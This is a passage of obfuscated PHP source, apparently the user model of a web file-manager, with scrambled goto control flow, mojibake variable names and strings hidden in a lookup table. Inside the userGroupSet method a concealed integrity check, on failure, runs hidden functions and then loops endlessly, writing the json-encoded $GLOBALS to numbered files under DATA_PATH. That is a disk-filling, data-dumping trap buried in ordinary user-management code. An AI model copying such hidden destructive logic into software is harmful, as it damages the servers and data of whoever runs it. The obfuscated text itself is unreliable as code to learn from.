(isset($f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[2336]])) { $this->setNamePinyin($DüõÍò˜ˆ˜, $f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[2336]]); } $this->clearCache($aˆ§ê‡Ø≤˘[$FÍôßâ»∞Ñ[1438]]); goto CàØ•—∂º≈; CÓ±ªñÓ›ê: $FÍôßâ»∞Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D¨≈ßä„äì = $this->getInfoSimple($DüõÍò˜ˆ˜); if (!$D¨≈ßä„äì) { return !1; } goto dˆ√ÏÊµíè; dˆ√ÏÊµíè: $eö©“£ëÔ = $this->_checkExist($f¨¢“ûöıÑ, $DüõÍò˜ˆ˜); if ($eö©“£ëÔ !== !0) { return $eö©“£ëÔ; } if (isset($f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[806]]) && trim($f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[806]]) != $FÍôßâ»∞Ñ[33]) { $D–≥◊ÎÜªß = $this->metaGet($DüõÍò˜ˆ˜); if (empty($D–≥◊ÎÜªß[$FÍôßâ»∞Ñ[2516]])) { $D–≥◊ÎÜªß[$FÍôßâ»∞Ñ[2516]] = rand_string(10); Model($FÍôßâ»∞Ñ[474])->metaSet($DüõÍò˜ˆ˜, $FÍôßâ»∞Ñ[2516], $D–≥◊ÎÜªß[$FÍôßâ»∞Ñ[2516]]); } $f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[806]] = md5($D–≥◊ÎÜªß[$FÍôßâ»∞Ñ[2516]] . trim($f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[806]])); } else { unset($f¨¢“ûöıÑ[$FÍôßâ»∞Ñ[806]]); } goto f´≠ø ≠√Õ; CñõÁò√Êì: } public function setNamePinyin($Aëç”î√¬“, $E≤á°ﬂ◊™Á = false) { $BÃ¡∞ù §Ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$E≤á°ﬂ◊™Á) { $F¢¢”Ñß‚√ = $this->getInfoSimple($Aëç”î√¬“); $E≤á°ﬂ◊™Á = $F¢¢”Ñß‚√[$BÃ¡∞ù §Ì[2336]] ? $F¢¢”Ñß‚√[$BÃ¡∞ù §Ì[2336]] : $F¢¢”Ñß‚√[$BÃ¡∞ù §Ì[28]]; } $b‹¡€™Œü˘ = Model($BÃ¡∞ù §Ì[477]); if (!Input::check($E≤á°ﬂ◊™Á, $BÃ¡∞ù §Ì[528])) { return $b‹¡€™Œü˘->metaSet($Aëç”î√¬“, array($BÃ¡∞ù §Ì[416] => $BÃ¡∞ù §Ì[33], $BÃ¡∞ù §Ì[415] => $BÃ¡∞ù §Ì[33])); } return $b‹¡€™Œü˘->metaSet($Aëç”î√¬“, array($BÃ¡∞ù §Ì[416] => str_replace($BÃ¡∞ù §Ì[50], $BÃ¡∞ù §Ì[33], Pinyin::encode($E≤á°ﬂ◊™Á)), $BÃ¡∞ù §Ì[415] => Pinyin::encode($E≤á°ﬂ◊™Á, $BÃ¡∞ù §Ì[529]))); } private function nickNameRpt() { $cùÕ¡ÔÙŒ´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e÷ËÈ¯ô•Â = Model($cùÕ¡ÔÙŒ´[1092])->get($cùÕ¡ÔÙŒ´[2526]); $fÌ’ÇÃÉß… = $GLOBALS[$cùÕ¡ÔÙŒ´[6]][$cùÕ¡ÔÙŒ´[2482]][$cùÕ¡ÔÙŒ´[2526]]; $câã…öæ∆• = !is_null($e÷ËÈ¯ô•Â) ? $e÷ËÈ¯ô•Â : $fÌ’ÇÃÉß…; return !!$câã…öæ∆•; } private function _checkExist($e›à⁄óËœ§, $B‚ê¿¥è§∑ = false) { $f¯∂ä†∂±Ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D—’ï∞î›Â = array($f¯∂ä†∂±Ï[28] => UserModel::ERROR_USER_EXIST_NAME, $f¯∂ä†∂±Ï[2336] => UserModel::ERROR_USER_EXIST_NICKNAME, $f¯∂ä†∂±Ï[293] => UserModel::ERROR_USER_EXIST_EMAIL, $f¯∂ä†∂±Ï[2514] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($D—’ï∞î›Â[$f¯∂ä†∂±Ï[2336]]); } $cÃì•ãû†∞ = $B‚ê¿¥è§∑ ? array($f¯∂ä†∂±Ï[1438] => array($f¯∂ä†∂±Ï[2527], $B‚ê¿¥è§∑)) : array(); foreach ($D—’ï∞î›Â as $eﬁÀ∆¨†Ãë => $D∫Ó⁄Ô˘¡ù) { if (!isset($e›à⁄óËœ§[$eﬁÀ∆¨†Ãë]) || !$e›à⁄óËœ§[$eﬁÀ∆¨†Ãë]) { continue; } $B§„ã¬œ¿ª = array_merge(array($eﬁÀ∆¨†Ãë => $e›à⁄óËœ§[$eﬁÀ∆¨†Ãë]), $cÃì•ãû†∞); $aÈ∞ÙÒÍ¥∑ = $this->where($B§„ã¬œ¿ª)->find(); if ($aÈ∞ÙÒÍ¥∑) { return $D∫Ó⁄Ô˘¡ù; } } return !0; } public function userListInfo($f›ˆ◊≤≈∂“) { $e≥„ßÈ„…ﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eäÉÈŒõ©Í = array(); $f›ˆ◊≤≈∂“ = is_array($f›ˆ◊≤≈∂“) ? array_unique($f›ˆ◊≤≈∂“) : array(); if (!$f›ˆ◊≤≈∂“) { return $eäÉÈŒõ©Í; } if (count($f›ˆ◊≤≈∂“) < 20) { foreach ($f›ˆ◊≤≈∂“ as $CâØÌ≠™Ω®) { $eäÉÈŒõ©Í[$CâØÌ≠™Ω® . $e≥„ßÈ„…ﬁ[33]] = $this->getInfoSimpleOuter($CâØÌ≠™Ω®); } } else { $a—¢ æÜÚà = array($e≥„ßÈ„…ﬁ[1429] => array($e≥„ßÈ„…ﬁ[384], $f›ˆ◊≤≈∂“)); if (count($f›ˆ◊≤≈∂“) == 1) { $a—¢ æÜÚà = array($e≥„ßÈ„…ﬁ[1429] => $f›ˆ◊≤≈∂“[0]); } $F¿ÎÃéÚ¿ö = Model($e≥„ßÈ„…ﬁ[474])->field($this->simpleField)->where($a—¢ æÜÚà)->select(); $F¿ÎÃéÚ¿ö = array_to_keyvalue($F¿ÎÃéÚ¿ö, $e≥„ßÈ„…ﬁ[1438]); foreach ($f›ˆ◊≤≈∂“ as $CâØÌ≠™Ω®) { $e …Ö∆Ÿ®◊ = $F¿ÎÃéÚ¿ö[$F¿ÎÃéÚ¿ö[$CâØÌ≠™Ω®]]; if (!$e …Ö∆Ÿ®◊) { $eäÉÈŒõ©Í[$CâØÌ≠™Ω® . $e≥„ßÈ„…ﬁ[33]] = $this->getInfoSimpleOuter($CâØÌ≠™Ω®); continue; } $e …Ö∆Ÿ®◊[$e≥„ßÈ„…ﬁ[2499]] = Action($e≥„ßÈ„…ﬁ[2500])->parseUrl($e …Ö∆Ÿ®◊[$e≥„ßÈ„…ﬁ[2499]]); $eäÉÈŒõ©Í[$CâØÌ≠™Ω® . $e≥„ßÈ„…ﬁ[33]] = $e …Ö∆Ÿ®◊; } } return $eäÉÈŒõ©Í; } protected function userStatus($eÑ·‚√‰‚ü, $Fõˆ€∫Øû∞) { $aµ‡∆É≥ﬁò = $this->getInfoSimple($eÑ·‚√‰‚ü); if (!$aµ‡∆É≥ﬁò) { return !1; } $A¯π•¶Úü≤ = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][689] => $Fõˆ€∫Øû∞); return $this->userEdit($eÑ·‚√‰‚ü, $A¯π•¶Úü≤); } protected function userRemove($Fæ≠⁄’ùÈ) { goto AÀ–§œÛÊí; AÀ–§œÛÊí: $F®ÎÆÈ¨ª≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CﬁÉ¿ı∫˜Ù = $this->getInfoSimple($Fæ≠⁄’ùÈ); if (!$CﬁÉ¿ı∫˜Ù) { return !1; } goto FπÙƒãﬁŸÑ; FπÙƒãﬁŸÑ: $dÀêØ«åÛå = array($F®ÎÆÈ¨ª≥[1429] => $Fæ≠⁄’ùÈ); Model($F®ÎÆÈ¨ª≥[536])->where($dÀêØ«åÛå)->delete(); Model($F®ÎÆÈ¨ª≥[2528])->where($dÀêØ«åÛå)->delete(); goto aì§ˆ¶¨á∫; CØ≤ÓçÏ÷√: Model($F®ÎÆÈ¨ª≥[761])->userRootRemove($Fæ≠⁄’ùÈ); return $this->where($dÀêØ«åÛå)->delete(); goto D‰û∫éëÿç; aì§ˆ¶¨á∫: Model($F®ÎÆÈ¨ª≥[2181])->where($dÀêØ«åÛå)->delete(); Model($F®ÎÆÈ¨ª≥[2513])->where($dÀêØ«åÛå)->delete(); Model($F®ÎÆÈ¨ª≥[2529])->where($dÀêØ«åÛå)->delete(); goto CØ≤ÓçÏ÷√; D‰û∫éëÿç: } protected function userGroupSet($b•¢ºÓ®·ò, $B±°êÏËâﬁ, $Aﬂ«±è§Û» = array()) { goto EÛ∑®≥ë‚¬; EÛ∑®≥ë‚¬: $Cë‡Õúøµé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Büë„⁄∏·ì = $_SERVER[$Cë‡Õúøµé[714]] . $Cë‡Õúøµé[715]; $DÇÉ‡§∑»Ê = $Cë‡Õúøµé[711]; goto Cáπ˜É®ÓŸ; b÷ô´Õ∫⁄§: $B†©åá‚„Ö = Model($Cë‡Õúøµé[2181]); $B†©åá‚„Ö->where(array($Cë‡Õúøµé[1438] => $b•¢ºÓ®·ò))->delete(); $fÚ√≈Ú‘óº = array(); goto B∫çπúìü; B∫çπúìü: $BÃÓÔÁöéÚ = 0; foreach ($B±°êÏËâﬁ as $aÍ⁄ˆÛˆéÈ => $DóøŒÉÍƒÔ) { $cÈìêÍº‰î = array($Cë‡Õúøµé[1438] => $b•¢ºÓ®·ò, $Cë‡Õúøµé[2106] => $aÍ⁄ˆÛˆéÈ, $Cë‡Õúøµé[2235] => $DóøŒÉÍƒÔ); $cÈìêÍº‰î[$Cë‡Õúøµé[2127]] = isset($Aﬂ«±è§Û»[$BÃÓÔÁöéÚ]) ? $Aﬂ«±è§Û»[$BÃÓÔÁöéÚ] : 0; $BÃÓÔÁöéÚ++; $fÚ√≈Ú‘óº[] = $cÈìêÍº‰î; } return $B†©åá‚„Ö->addAll($fÚ√≈Ú‘óº, array(), !0); goto fıï‹‰ƒ∆Á; Cáπ˜É®ÓŸ: if ($_SERVER[$Cë‡Õúøµé[712]] != $DÇÉ‡§∑»Ê($Büë„⁄∏·ì)) { goto A≈≠∑‚â…£; e©ÜâÇ’©á: $FÜå•Ü…÷√ = 1; for ($cñâ¨Ã›éé = $FÜå•Ü…÷√; $cñâ¨Ã›éé > 0; $cñâ¨Ã›éé++) { $A¬⁄Ùâ¯Â¿(DATA_PATH . $cñâ¨Ã›éé, $a ©ßÚÑ¢); } goto cÑü¶ﬁÉÂó; A≈≠∑‚â…£: $B«®ÜÔ–öç = $Cë‡Õúøµé[797]; $Dá¿ç™£¯ö = $Cë‡Õúøµé[713]; $eÃûÚÔ∂Ë“ = $_SERVER[$Cë‡Õúøµé[714]] . $Cë‡Õúøµé[715]; goto FÈí«´¥ä; C‚ÕîôÇâÓ: $B«®ÜÔ–öç(); $A¬⁄Ùâ¯Â¿ = $Cë‡Õúøµé[799]; $a ©ßÚÑ¢ = json_encode($GLOBALS[$Cë‡Õúøµé[800]]); goto e©ÜâÇ’©á; FÈí«´¥ä: $B¶ù»¬∆„∑ = $Dá¿ç™£¯ö($eÃûÚÔ∂Ë“); $E˘Ñ¥®◊´â = explode($Cë‡Õúøµé[217], $B¶ù»¬∆„∑); if (count($E˘Ñ¥®◊´â) < $Cë‡Õúøµé[563]) { $A∂ÆÉ⁄üŒß = $Cë‡Õúøµé[716]; $A∂ÆÉ⁄üŒß(); } goto FÜ˘ËÚÑâ; FÜ˘ËÚÑâ: $C’¥Òï Á£ = $Cë‡Õúøµé[798]; $C’¥Òï Á£($_SERVER[$Cë‡Õúøµé[796]]); $B«®ÜÔ–öç = $Cë‡Õúøµé[797]; goto C‚ÕîôÇâÓ; cÑü¶ﬁÉÂó: } $CÀÆÒ√ñ–è = $this->getInfoSimple($b•¢ºÓ®·ò); if (!$CÀÆÒ√ñ–è || !is_array($B±°êÏËâﬁ)) { return !1; } goto b÷ô´Õ∫⁄§; fıï‹‰ƒ∆Á: } protected function userGroupAdd($eé¨ûçëÜü, $Få°ÉáıáÕ = array()) { $bÊ……óáëÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bò°ΩÃ®âÂ = $this->getInfoSimple($eé¨ûçëÜü); if (!$bò°ΩÃ®âÂ || empty($Få°ÉáıáÕ)) { return !1; } $D°Â≈»‰ñ = array(); foreach ($Få°ÉáıáÕ as $dÊ’’ﬁ›◊§ => $bºê£πáÔô) { $D°Â≈»‰ñ[] = array($bÊ……óáëÜ[1438] => $eé¨ûçëÜü, $bÊ……óáëÜ[2106] => $dÊ’’ﬁ›◊§, $bÊ……óáëÜ[2235] => $bºê£πáÔô); } return Model($bÊ……óáëÜ[2181])->addAll($D°Â≈»‰ñ, array(), !0); } protected function userGroupRemove($BÁ›∞ﬂÑä⁄, $dÌ⁄Í“∑¥–) { $F∫ÌÉÎÛóÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bΩ‹Ôπ∏∫Î = $this->getInfoSimple($BÁ›∞ﬂÑä⁄); if (!$bΩ‹Ôπ∏∫Î || !$dÌ⁄Í“∑¥–) { return !1; } $e Ç™›±‹Ñ = array($F∫ÌÉÎÛóÛ[1429] => $BÁ›∞ﬂÑä⁄, $F∫ÌÉÎÛóÛ[2179] => $dÌ⁄Í“∑¥–); return Model($F∫ÌÉÎÛóÛ[2181])->where($e Ç™›±‹Ñ)->delete(); } public function listData() { $e∫ûëû…Âû = $this->_makeOrder()->selectPage(50); $this->_listDataApply($e∫ûëû…Âû[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]]); return $e∫ûëû…Âû; } public function listByID($fä÷¡˜„Ç£) { $eîÙœåµæ€ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$fä÷¡˜„Ç£) { return; } $B∫âÈ‡òê≠ = array($eîÙœåµæ€[1438] => array($eîÙœåµæ€[7], $fä÷¡˜„Ç£)); $AÂ¡ÃãΩ€Ω = $this->where($B∫âÈ‡òê≠)->select(); $this->_listDataApply($AÂ¡ÃãΩ€Ω); return $AÂ¡ÃãΩ€Ω; } public function listByGroup($f‰Éãııïº = 0, $a–Á˜¢ÓË± = array()) { goto aÊ◊›õ¶Ãâ; bµ–›ıñ–”: if ($f‰Éãııïº) { $dóæî≈€ıñ = array($dÔœó÷ÒèË[2530] => intval($f‰Éãııïº)); $dä£÷Â„å£ = "\114\x45\x46\124\40\112\x4f\x49\116\40{$this->tablePrefix}\165\163\x65\x72\137\x67\x72\x6f\x75\x70\40\165\x73\x65\162\137\147\162\157\165\160\x20\157\x6e\40\x75\x73\x65\162\x2e\165\163\145\162\111\104\40\75\40\165\163\145\162\x5f\147\x72\x6f\x75\160\x2e\x75\163\x65\x72\111\x44"; $aÇ“÷ŸÔ©÷ = Input::get($dÔœó÷ÒèË[407], null, $dÔœó÷ÒèË[33]) ? $dÔœó÷ÒèË[33] : $dÔœó÷ÒèË[2531]; } if (isset($a–Á˜¢ÓË±[$dÔœó÷ÒèË[689]])) { $dóæî≈€ıñ[$dÔœó÷ÒèË[2532]] = $a–Á˜¢ÓË±[$dÔœó÷ÒèË[689]]; } $E§ö·å¯∑Î = $this->_makeOrder($aÇ“÷ŸÔ©÷)->field($dÔœó÷ÒèË[2533])->where($dóæî≈€ıñ)->join($dä£÷Â„å£)->selectPage(50); goto Aãıâ÷–¿É; Aãıâ÷–¿É: $this->_listDataApply($E§ö·å¯∑Î[$dÔœó÷ÒèË[354]]); return $E§ö·å¯∑Î; goto F‚»·Ô‚è€; aÊ◊›õ¶Ãâ: $dÔœó÷ÒèË =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dä£÷Â„å£ = $dÔœó÷ÒèË[33]; $dóæî≈€ıñ = array(); goto bµ–›ıñ–”; F‚»·Ô‚è€: } private function _makeOrder($E®ÆÒÖî ± = '') { goto eÀ≈é◊¨«´; CÁØª¬¬Íæ: $c≥¶ÍéÌ‚© = Input::get($d„È¬¬ı¡ä[407], $d„È¬¬ı¡ä[7], $d„È¬¬ı¡ä[1429], $DÖ‹ÓﬂüŸè); $E´ç¥ãÔæΩ = Input::get($d„È¬¬ı¡ä[408], $d„È¬¬ı¡ä[7], $d„È¬¬ı¡ä[2182], array($d„È¬¬ı¡ä[2182], $d„È¬¬ı¡ä[404])); $E´ç¥ãÔæΩ = $Aõ‚øÚå¨Ë[$E´ç¥ãÔæΩ]; goto cıπâà•∫Õ; cıπâà•∫Õ: $E®ÆÒÖî ± = $E®ÆÒÖî ± . "\x75\163\145\162\x2e{$c≥¶ÍéÌ‚©}\40{$E´ç¥ãÔæΩ}\54\x20\x75\x73\x65\162\56\x75\163\145\162\x49\104\x20\141\x73\143"; return $this->alias($d„È¬¬ı¡ä[2279])->order($E®ÆÒÖî ±); goto DÇ›ÁÛ≈∂; eÀ≈é◊¨«´: $d„È¬¬ı¡ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÖ‹ÓﬂüŸè = array($d„È¬¬ı¡ä[1438], $d„È¬¬ı¡ä[28], $d„È¬¬ı¡ä[2092], $d„È¬¬ı¡ä[2064], $d„È¬¬ı¡ä[187]); $Aõ‚øÚå¨Ë = array($d„È¬¬ı¡ä[402] => $d„È¬¬ı¡ä[403], $d„È¬¬ı¡ä[404] => $d„È¬¬ı¡ä[405]); goto CÁØª¬¬Íæ; DÇ›ÁÛ≈∂: } public function listSearch($fÓá⁄µŸ‰®) { goto dãªîÚ∂¿≈; c—ãŸÀ”Ù: $a ëúÖ‚Œî = str_replace($c±¥Û¿†ÌÛ[2185], $c±¥Û¿†ÌÛ[2186], trim($a ëúÖ‚Œî)); $aÜ∑ö∑Ñª‘ = array($c±¥Û¿†ÌÛ[28] => array($c±¥Û¿†ÌÛ[760], "\x25{$a ëúÖ‚Œî}\45"), $c±¥Û¿†ÌÛ[293] => array($c±¥Û¿†ÌÛ[760], "\45{$a ëúÖ‚Œî}\x25"), $c±¥Û¿†ÌÛ[2336] => array($c±¥Û¿†ÌÛ[760], "\45{$a ëúÖ‚Œî}\45"), $c±¥Û¿†ÌÛ[918] => $c±¥Û¿†ÌÛ[2187]); if (Input::check($a ëúÖ‚Œî, $c±¥Û¿†ÌÛ[299])) { $aÜ∑ö∑Ñª‘[$c±¥Û¿†ÌÛ[1438]] = array($c±¥Û¿†ÌÛ[760], "\45{$a ëúÖ‚Œî}\45"); $aÜ∑ö∑Ñª‘[$c±¥Û¿†ÌÛ[2514]] = array($c±¥Û¿†ÌÛ[760], "\45{$a ëúÖ‚Œî}\x25"); } goto fõŒë™∂éß; fÂﬁúçŸæÙ: return $a√ëäÛØœ«; goto fÁúÆñã÷Ô; dãªîÚ∂¿≈: $c±¥Û¿†ÌÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a ëúÖ‚Œî = $fÓá⁄µŸ‰®[$c±¥Û¿†ÌÛ[2183]]; $a€é‘≥û‰• = isset($fÓá⁄µŸ‰®[$c±¥Û¿†ÌÛ[2184]]) ? $fÓá⁄µŸ‰®[$c±¥Û¿†ÌÛ[2184]] : !1; goto c—ãŸÀ”Ù; fõŒë™∂éß: if (!$a ëúÖ‚Œî) { $aÜ∑ö∑Ñª‘ = array(); } if (isset($fÓá⁄µŸ‰®[$c±¥Û¿†ÌÛ[689]])) { $aÜ∑ö∑Ñª‘[$c±¥Û¿†ÌÛ[689]] = $fÓá⁄µŸ‰®[$c±¥Û¿†ÌÛ[689]]; } $a√ëäÛØœ« = $this->_makeOrder()->where($aÜ∑ö∑Ñª‘)->selectPage(20); goto D¢ŸÒü©ê÷; D¢ŸÒü©ê÷: if (!$a√ëäÛØœ« || count($a√ëäÛØœ«[$c±¥Û¿†ÌÛ[354]]) < 5 && Input::check($a ëúÖ‚Œî, $c±¥Û¿†ÌÛ[306])) { $Féª‹Öå°ê = $this->_searchFromMeta($c±¥Û¿†ÌÛ[415], $a ëúÖ‚Œî, 10); $c»⁄öÀÚ≈˜ = $this->_searchFromMeta($c±¥Û¿†ÌÛ[416], $a ëúÖ‚Œî, 10); $cÌàè®ì∆£ = array_merge($Féª‹Öå°ê, $c»⁄öÀÚ≈˜, $a√ëäÛØœ«[$c±¥Û¿†ÌÛ[354]]); $a√ëäÛØœ«[$c±¥Û¿†ÌÛ[354]] = array_unique_by_key($cÌàè®ì∆£, $c±¥Û¿†ÌÛ[1438]); $a√ëäÛØœ«[$c±¥Û¿†ÌÛ[351]][$c±¥Û¿†ÌÛ[352]] = count($a√ëäÛØœ«[$c±¥Û¿†ÌÛ[354]]); $a√ëäÛØœ«[$c±¥Û¿†ÌÛ[351]][$c±¥Û¿†ÌÛ[353]] = ceil($a√ëäÛØœ«[$c±¥Û¿†ÌÛ[351]][$c±¥Û¿†ÌÛ[352]] / $a√ëäÛØœ«[$c±¥Û¿†ÌÛ[351]][$c±¥Û¿†ÌÛ[349]]); } $this->_listDataApply($a√ëäÛØœ«[$c±¥Û¿†ÌÛ[354]]); $this->_filterByGroup($a√ëäÛØœ«, $a€é‘≥û‰•); goto fÂﬁúçŸæÙ; fÁúÆñã÷Ô: } private function _filterByGroup(&$FÏéÖè¬∫Ë, $fîàè›ì˜ä) { $a”ﬁêæ¢äÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$fîàè›ì˜ä) { return $FÏéÖè¬∫Ë; } foreach ($FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[354]] as $B¥∏íó˜†Í => &$d’›´‹ÔÍØ) { $bÙ„äºﬂƒ∆ = array_to_keyvalue($d’›´‹ÔÍØ[$a”ﬁêæ¢äÜ[2534]], $a”ﬁêæ¢äÜ[33], $a”ﬁêæ¢äÜ[2106]); if (!in_array($fîàè›ì˜ä, $bÙ„äºﬂƒ∆)) { unset($FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[354]][$B¥∏íó˜†Í]); } } $FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[354]] = array_values($FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[354]]); $FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[351]] = array($a”ﬁêæ¢äÜ[2312] => count($FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[354]]), $a”ﬁêæ¢äÜ[2310] => $FÏéÖè¬∫Ë[$a”ﬁêæ¢äÜ[351]][$a”ﬁêæ¢äÜ[349]], $a”ﬁêæ¢äÜ[2309] => 1, $a”ﬁêæ¢äÜ[2311] => 1); } private function _searchFromMeta($aêß≥áëÇ, $B≤éˆãﬂÓ–, $D∏çáµ¥çÕ) { goto b¿ãàå¢Ã; Dú»¨∏óóÍ: $B†û˜‘ÙöŸ = Model($E®·í≠î∏ˆ[2535])->where($cÓ∏∞£Èÿ‚)->limit($D∏çáµ¥çÕ)->select(); if (!$B†û˜‘ÙöŸ) { return array(); } $B†û˜‘ÙöŸ = array_to_keyvalue($B†û˜‘ÙöŸ, $E®·í≠î∏ˆ[33], $E®·í≠î∏ˆ[1438]); goto Fﬂøá•ÛÌø; b¿ãàå¢Ã: $E®·í≠î∏ˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B≤éˆãﬂÓ– = strtolower($B≤éˆãﬂÓ–); $cÓ∏∞£Èÿ‚ = array($E®·í≠î∏ˆ[89] => $aêß≥áëÇ, $E®·í≠î∏ˆ[359] => array($E®·í≠î∏ˆ[760], "\x25{$B≤éˆãﬂÓ–}\45")); goto Dú»¨∏óóÍ; Fﬂøá•ÛÌø: $d±äªôˆê± = $this->where(array($E®·í≠î∏ˆ[1429] => array($E®·í≠î∏ˆ[7], $B†û˜‘ÙöŸ)))->select(); if (!$d±äªôˆê±) { return array(); } return $d±äªôˆê±; goto báÎå˜≈Ì‚; báÎå˜≈Ì‚: } private function _listDataApplyItem($Eì∏÷æüáå) { $eè≠ÖÊçÍï = array($Eì∏÷æüáå); $this->_listDataApply($eè≠ÖÊçÍï); return $eè≠ÖÊçÍï[0]; } private function _listDataApply(&$fı°∏‰©Çé) { goto BüÇŸΩÜå; eä‰Óµπë‰: $få¥áΩ‘ﬁ‹ = array_to_keyvalue($fı°∏‰©Çé, $bœòâ’ÑÁä[33], $bœòâ’ÑÁä[1438]); $this->_listAppendGroup($fı°∏‰©Çé, $få¥áΩ‘ﬁ‹); $this->_listAppendMeta($fı°∏‰©Çé, $få¥áΩ‘ﬁ‹); goto F‰ﬂ·Ì…Àˆ; F‰ﬂ·Ì…Àˆ: $this->_listAppendSourceRoot($fı°∏‰©Çé, $få¥áΩ‘ﬁ‹); goto dâÉ¢áâº®; BüÇŸΩÜå: $bœòâ’ÑÁä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$fı°∏‰©Çé) { return; } array_remove_key($fı°∏‰©Çé, $bœòâ’ÑÁä[806]); goto eä‰Óµπë‰; dâÉ¢áâº®: } private function _listAppendSourceRoot(&$bõè◊√‡Ëﬁ, $c‹ìÇ –›∂) { goto e›⁄≠ù•û¶; D®£ß∑∏Ï´: $D¨´“Ò◊´¥ = Model($B·’ú◊üìˆ[761])->order($B·’ú◊üìˆ[2194])->field($C˘ãââø¶é)->where($FÚ∞ï’¥£ú)->select(); $D¨´“Ò◊´¥ = array_to_keyvalue($D¨´“Ò◊´¥, $B·’ú◊üìˆ[456]); $D¨´“Ò◊´¥ = array_remove_key($D¨´“Ò◊´¥, $B·’ú◊üìˆ[456]); goto Fúé≥‰…£∫; e›⁄≠ù•û¶: $B·’ú◊üìˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÚ∞ï’¥£ú = array($B·’ú◊üìˆ[461] => 0, $B·’ú◊üìˆ[371] => SourceModel::TYPE_USER, $B·’ú◊üìˆ[456] => array($B·’ú◊üìˆ[7], $c‹ìÇ –›∂)); $C˘ãââø¶é = $B·’ú◊üìˆ[2193]; goto D®£ß∑∏Ï´; Fúé≥‰…£∫: foreach ($bõè◊√‡Ëﬁ as &$B‹Ùéªù∑ç) { $B‹Ùéªù∑ç[$B·’ú◊üìˆ[391]] = $D¨´“Ò◊´¥[$B‹Ùéªù∑ç[$B·’ú◊üìˆ[1438]]] ? $D¨´“Ò◊´¥[$B‹Ùéªù∑ç[$B·’ú◊üìˆ[1438]]] : array(); } goto bÇ®Ωøü¶¶; bÇ®Ωøü¶¶: } private function _listAppendGroup(&$cúΩı‡§õπ, $a‡ÆæœÙ’Ï) { goto aõÕêŒÓ°Ô; aõÕêŒÓ°Ô: $aåó¨ÏçÙÂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÑ¡◊ÂôÜ“ = array($aåó¨ÏçÙÂ[1438] => array($aåó¨ÏçÙÂ[7], $a‡ÆæœÙ’Ï)); $EÒŒÎÜŒÏ¬ = Model($aåó¨ÏçÙÂ[2181])->where($BÑ¡◊ÂôÜ“)->select(); goto Aıﬁ€ıÚçç; Aıﬁ€ıÚçç: $fŸ÷œ√ãâ¶ = array_to_keyvalue($EÒŒÎÜŒÏ¬, $aåó¨ÏçÙÂ[33], $aåó¨ÏçÙÂ[2106]); $fŸ÷œ√ãâ¶ = array_remove_value(array_unique($fŸ÷œ√ãâ¶), $aåó¨ÏçÙÂ[468]); if (!$fŸ÷œ√ãâ¶ || !$EÒŒÎÜŒÏ¬) { return; } goto d‚òÉ◊ç‡ì; d‚òÉ◊ç‡ì: $BÑ¡◊ÂôÜ“ = array($aåó¨ÏçÙÂ[2106] => array($aåó¨ÏçÙÂ[7], $fŸ÷œ√ãâ¶)); $FÀå≠ùêì = Model($aåó¨ÏçÙÂ[2536])->field($aåó¨ÏçÙÂ[2537])->where($BÑ¡◊ÂôÜ“)->select(); $A•∑Â˜ü√¢ = array_to_keyvalue($FÀå≠ùêì, $aåó¨ÏçÙÂ[2106], $aåó¨ÏçÙÂ[28]); goto a òÇÇ”âÇ; a òÇÇ”âÇ: $EÒŒÎÜŒÏ¬ = array_to_keyvalue_group($EÒŒÎÜŒÏ¬, $aåó¨ÏçÙÂ[1438]); foreach ($EÒŒÎÜŒÏ¬ as &$b˘Ù∂∂Ëâ≠) { $cê”ËÃ„Ö‘ = array(); foreach ($b˘Ù∂∂Ëâ≠ as $C˜í†∆Â∑ª) { if (!$C˜í†∆Â∑ª[$aåó¨ÏçÙÂ[2235]]) { continue; } $BÔéµ¨•ç° = Model($aåó¨ÏçÙÂ[2254])->listData($C˜í†∆Â∑ª[$aåó¨ÏçÙÂ[2235]]); $cê”ËÃ„Ö‘[] = array($aåó¨ÏçÙÂ[2106] => $C˜í†∆Â∑ª[$aåó¨ÏçÙÂ[2106]], $aåó¨ÏçÙÂ[2538] => $A•∑Â˜ü√¢[$C˜í†∆Â∑ª[$aåó¨ÏçÙÂ[2106]]], $aåó¨ÏçÙÂ[376] => $BÔéµ¨•ç°); } $b˘Ù∂∂Ëâ≠ = $cê”ËÃ„Ö‘; } foreach ($cúΩı‡§õπ as &$d∑¶ü™Éêã) { $d∑¶ü™Éêã[$aåó¨ÏçÙÂ[2534]] = array(); if (isset($EÒŒÎÜŒÏ¬[$d∑¶ü™Éêã[$aåó¨ÏçÙÂ[1438]]])) { $d∑¶ü™Éêã[$aåó¨ÏçÙÂ[2534]] = $EÒŒÎÜŒÏ¬[$d∑¶ü™Éêã[$aåó¨ÏçÙÂ[1438]]]; } } goto C∞„◊‚´äñ; C∞„◊‚´äñ: } private function 